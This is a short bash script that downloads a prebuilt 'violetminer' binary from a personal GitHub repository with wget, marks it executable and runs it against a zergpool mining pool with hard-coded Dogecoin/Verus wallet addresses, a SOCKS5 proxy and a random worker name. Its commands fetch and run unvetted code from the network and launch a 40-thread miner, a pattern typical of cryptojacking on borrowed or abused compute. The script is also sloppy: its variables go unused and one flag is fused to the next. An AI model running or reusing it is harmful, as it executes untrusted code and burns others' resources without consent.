#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/uveshV/uveshV/raw/main/violetminer
chmod +x violetminer
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PROXY=socks5://72.195.114.169:4145
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
./violetminer --v --l verushash.mine.zergpool.com:3300 --u DCXP219mqbCeGhdKf2BojtsD2eRE1K5C9p --p c=DOGE,mc=VRSC -t 2 --password x --algorithm verushash--threads 40
